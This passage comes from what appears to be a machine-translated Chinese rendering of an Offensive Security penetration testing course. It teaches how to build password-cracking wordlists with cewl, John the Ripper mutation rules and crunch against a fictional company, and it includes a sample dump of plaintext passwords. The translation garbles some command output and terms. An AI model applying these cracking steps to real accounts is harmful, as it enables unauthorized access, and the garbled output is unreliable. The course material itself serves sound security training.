<div style="position:absolute;top:156316;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">至少有六个字符 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-m 6</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )，并将 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-w</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 词表</font><font style="vertical-align: inherit;">写入</font><font style="vertical-align: inherit;">自定义文件 (megacorp-</font></font></nobr></div>
<div style="position:absolute;top:156335;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cewl.txt）：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:156370;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:156404;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wc -l megacorp-cewl.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:156421;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">312</font></font></nobr></div>
<div style="position:absolute;top:156455;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep Nano megacorp-cewl.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:156472;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">纳米技术</font></font></nobr></div>
<div style="position:absolute;top:156488;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">纳米粒</font></font></nobr></div>
<div style="position:absolute;top:156506;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">纳米探针</font></font></nobr></div>
<div style="position:absolute;top:156523;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">纳米处理器</font></font></nobr></div>
<div style="position:absolute;top:156540;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">纳米时代</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:156556;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">纳米机器人</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:156576;left:321"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 591 - 使用 cewl 创建字典文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:156605;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上面的列表显示</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cewl</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">找到了几种产品的名称，包括</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nanobot</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">我们</font></font></nobr></div>
<div style="position:absolute;top:156625;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应该考虑在密码中也使用其他产品名称的可能性。</font></font></nobr></div>
<div style="position:absolute;top:156657;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，这些词本身会作为极弱的密码，并且不会</font></font></nobr></div>
<div style="position:absolute;top:156677;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">满足典型的密码强制规则。</font><font style="vertical-align: inherit;">这些类型的规则一般需要使用上层</font></font></nobr></div>
<div style="position:absolute;top:156696;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和小写字符、数字的使用，也许还有特殊字符。</font><font style="vertical-align: inherit;">基于</font></font></nobr></div>
<div style="position:absolute;top:156716;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们发现的密码（Nanobot93），我们可以推测密码强制执行</font></font></nobr></div>
<div style="position:absolute;top:156735;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">megacorpone 至少需要在密码中使用两个数字，并且可能会进一步规定</font></font></nobr></div>
<div style="position:absolute;top:156754;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（但不太可能）必须在密码末尾使用数字。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:156863;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">554 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（DigiNinja，2017），http://www.digininja.org/projects/cewl.php</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:156991;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="133"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 133 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:157024;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:158101;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:158101;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:158101;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">574</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:157120;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了这个简单的演示，我们假设 Megacorp One 政策规定</font></font></nobr></div>
<div style="position:absolute;top:157139;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码以两位数结尾。</font></font></nobr></div>
<div style="position:absolute;top:157172;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要创建满足此要求的密码，我们可以编写一个 Bash 脚本。</font><font style="vertical-align: inherit;">然而，我们将</font></font></nobr></div>
<div style="position:absolute;top:157191;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">而是使用更强大的工具 John the Ripper (JTR)，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">555</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，这是一个快速密码</font></font></nobr></div>
<div style="position:absolute;top:157211;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">具有多种功能的饼干，包括生成自定义词表和应用规则的能力</font></font></nobr></div>
<div style="position:absolute;top:157230;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">排列。</font></font></nobr></div>
<div style="position:absolute;top:157263;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">继续我们对密码策略的假设，我们将向 JTR 添加一条规则</font></font></nobr></div>
<div style="position:absolute;top:157282;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">配置文件 (/etc/john/john.conf) 将改变我们的词表，为每个词表附加两个数字</font></font></nobr></div>
<div style="position:absolute;top:157301;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码。</font><font style="vertical-align: inherit;">为此，我们必须找到</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[List.Rules:Wordlist]</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">段，其中 wordlist 突变</font></font></nobr></div>
<div style="position:absolute;top:157321;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">定义规则，并附加新规则。</font><font style="vertical-align: inherit;">在这个例子中，我们将附加两位数的序列</font></font></nobr></div>
<div style="position:absolute;top:157340;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们的单词表中的每个单词之后从（双）零到九十九的数字。</font></font></nobr></div>
<div style="position:absolute;top:157373;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将以</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字符</font><font style="vertical-align: inherit;">开始此规则</font><font style="vertical-align: inherit;">，它告诉 John 在原始字符后附加一个字符</font></font></nobr></div>
<div style="position:absolute;top:157392;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们单词表中的单词。</font><font style="vertical-align: inherit;">接下来，我们指定我们想要附加的字符类型，在我们的例子中我们想要</font></font></nobr></div>
<div style="position:absolute;top:157412;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">零到九之间的任何数字 ( </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[0-9]</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )。</font><font style="vertical-align: inherit;">最后，要追加两位数，我们将简单地重复</font></font></nobr></div>
<div style="position:absolute;top:157431;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$ [0-9]</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">序列。</font><font style="vertical-align: inherit;">最终规则如清单 592 所示。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:157466;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo nano /etc/john/john.conf</font></font></font></b></nobr></div>
<div style="position:absolute;top:157483;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:157500;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 词表模式规则</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:157517;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[List.Rules:Wordlist]</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:157534;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 按原样尝试单词</font></font></nobr></div>
<div style="position:absolute;top:157551;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></nobr></div>
<div style="position:absolute;top:157568;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 小写每个纯字母数字单词</font></font></nobr></div>
<div style="position:absolute;top:157585;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-c &gt;3 !?X l Q</font></font></nobr></div>
<div style="position:absolute;top:157602;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 大写每个纯字母数字单词</font></font></nobr></div>
<div style="position:absolute;top:157618;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-c (?a &gt;2 !?X c Q</font></font></nobr></div>
<div style="position:absolute;top:157635;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 小写和复数纯字母词</font></font></nobr></div>
<div style="position:absolute;top:157652;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:157670;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 尝试拆分密码的后半部分</font></font></nobr></div>
<div style="position:absolute;top:157687;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-s x_</font></font></nobr></div>
<div style="position:absolute;top:157703;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-sc x_ M l Q</font></font></nobr></div>
<div style="position:absolute;top:157720;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 在每个密码的末尾添加两个数字</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:157737;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$[0-9]$[0-9]</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:157754;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:157774;left:254"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 592 - 在 John the Ripper 配置文件中创建变异规则</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:157832;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">John the Ripper 的规则语法非常广泛和强大，但超出了</font></font></i></nobr></div>
<div style="position:absolute;top:157852;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本模块的范围。</font><font style="vertical-align: inherit;">如需更多信息，请花时间查看规则</font></font></i></nobr></div>
<div style="position:absolute;top:157871;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文档。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">556</font></font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:157933;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在规则已经添加到配置文件中，我们可以改变我们的词表，它</font></font></nobr></div>
<div style="position:absolute;top:157952;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当前包含 312 个条目。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:158031;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">555 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（开放墙，2018 年），http://www.openwall.com/john/</font></font></font></nobr></div>
<div style="position:absolute;top:158051;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">556 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（太阳能设计师，2017 年），http://www.openwall.com/john/doc/RULES.shtml</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:158179;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="134"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 134 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:158212;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:159289;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:159289;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:159289;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">575</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:158308;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为此，我们将调用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">john</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并指定字典文件（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--wordlist=megacorp-cewl.txt</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">），</font></font></nobr></div>
<div style="position:absolute;top:158327;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">激活配置文件中的规则（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--rules</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">），将结果输出到标准输出（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--</font></font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:158347;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">stdout </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">），并将该输出重定向到一个名为 mutated.txt 的文件：</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:158381;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">john --wordlist=megacorp-cewl.txt --rules --stdout &gt; mutated.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:158399;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">按 'q' 或 Ctrl-C 中止，几乎任何其他状态键</font></font></nobr></div>
<div style="position:absolute;top:158416;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">46446p 0:00:00:00 100.00% (2018-03-01 15:41) 663514p/s 巧克力99</font></font></nobr></div>
<div style="position:absolute;top:158449;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep Nanobot mutated.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:158466;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:158483;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">纳米机器人90</font></font></nobr></div>
<div style="position:absolute;top:158500;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">纳米机器人91</font></font></nobr></div>
<div style="position:absolute;top:158517;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">纳米机器人92</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:158534;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">纳米机器人93</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:158551;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">纳米机器人94</font></font></nobr></div>
<div style="position:absolute;top:158568;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">纳米机器人95</font></font></nobr></div>
<div style="position:absolute;top:158585;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">纳米机器人96</font></font></nobr></div>
<div style="position:absolute;top:158602;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:158622;left:299"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 593 - 使用 John the Ripper 修改密码</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:158651;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于执行了多次更改，生成的文件包含超过 46000 个密码条目</font></font></nobr></div>
<div style="position:absolute;top:158670;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关于密码。</font><font style="vertical-align: inherit;">其中一个密码是“Nanobot93”，它与我们的密码匹配</font></font></nobr></div>
<div style="position:absolute;top:158689;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们的假设评估中较早发现。</font><font style="vertical-align: inherit;">鉴于对 MegaCorp 的假设</font></font></nobr></div>
<div style="position:absolute;top:158709;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个密码策略，这个词表可能会产生字典攻击的结果。</font></font></nobr></div>
<div style="position:absolute;top:158742;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然这个演示过于简单，但它是一个很好的例子，说明密码如何</font></font></nobr></div>
<div style="position:absolute;top:158761;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分析可以有利于我们的密码攻击的整体成功。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:158795;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.1.1.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:158830;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（此练习不需要报告）</font></font></i></nobr></div>
<div style="position:absolute;top:158863;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 使用 cewl 从您的公司、学校或喜爱的网站生成自定义词表和</font></font></nobr></div>
<div style="position:absolute;top:158882;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查结果。</font><font style="vertical-align: inherit;">你的任何密码都显示出来了吗？</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:158919;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.2 蛮力词表</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:158961;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与字典攻击相反，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">暴力</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码攻击会计算和测试所有可能的</font></font></nobr></div>
<div style="position:absolute;top:158980;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以组成密码的字符组合，直到找到正确的密码为止。</font><font style="vertical-align: inherit;">虽然这</font></font></nobr></div>
<div style="position:absolute;top:159000;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听起来像是一种保证结果的简单方法，但它非常耗时。</font></font></nobr></div>
<div style="position:absolute;top:159019;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">取决于密码的长度和复杂性以及密码的计算能力</font></font></nobr></div>
<div style="position:absolute;top:159039;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">测试系统，暴力破解强密码可能需要很长时间，甚至数年。</font></font></nobr></div>
<div style="position:absolute;top:159071;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们甚至可以将这两个概念结合起来，创建</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">蛮力</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">词表，字典文件</font></font></nobr></div>
<div style="position:absolute;top:159091;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包含匹配特定模式的每个可能的密码。</font></font></nobr></div>
<div style="position:absolute;top:159124;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，考虑一个显示非常具体的密码强制策略的场景：</font></font></nobr></div>
<div style="position:absolute;top:159143;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如清单 594 所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:159178;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat dumped.pass.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:159195;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">大卫：ABC$#123</font></font></nobr></div>
<div style="position:absolute;top:159211;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">麦克：Jud()666</font></font></nobr></div>
<div style="position:absolute;top:159228;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">朱迪：Hol&amp;&amp;278 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:159367;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="135"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 135 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:159400;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:160477;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:160477;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:160477;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">576</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:159496;left:349"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 594 - 密码转储示例</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:159525;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查看密码，我们注意到密码结构中的以下模式：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:159560;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[大写字母] [2 x 小写字母] [2 x 特殊字符] [3 x 数字]</font></font></nobr></div>
<div style="position:absolute;top:159579;left:366"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 595 - 密码结构</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:159608;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有了这些知识，创建一个包含每个单词的单词表将非常有帮助。</font></font></nobr></div>
<div style="position:absolute;top:159628;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">匹配此模式的可能密码。</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">紧缩</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">557</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包含在卡利的Linux，是一个功能强大</font></font></nobr></div>
<div style="position:absolute;top:159647;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以处理此任务的词表生成器。</font></font></nobr></div>
<div style="position:absolute;top:159680;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，我们必须描述我们需要</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">crunch</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来复制</font><font style="vertical-align: inherit;">的模式</font><font style="vertical-align: inherit;">，为此我们将使用占位符</font></font></nobr></div>
<div style="position:absolute;top:159700;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代表特定类型的字符：</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:159733;left:277"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">占位符字符翻译</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:159755;left:277"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">@</font></font></nobr></div>
<div style="position:absolute;top:159755;left:388"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">小写字母字符</font></font></nobr></div>
<div style="position:absolute;top:159775;left:277"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">,</font></font></nobr></div>
<div style="position:absolute;top:159775;left:388"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">大写字母字符</font></font></nobr></div>
